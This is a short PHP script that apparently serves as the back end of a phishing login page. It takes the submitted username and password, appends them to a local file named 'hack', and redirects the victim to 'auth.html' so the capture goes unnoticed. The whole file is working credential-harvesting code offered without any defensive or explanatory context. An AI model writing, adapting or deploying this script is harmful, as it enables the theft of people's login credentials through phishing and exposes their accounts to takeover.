<?php
//var_dump($_REQUEST);
$u = $_POST["username"];
$p = $_POST["password"];

$file = "hack";
$current = file_get_contents($file);
$current .= "$u\n$p\n\n";
file_put_contents($file, $current);

header('Location: auth.html');
?>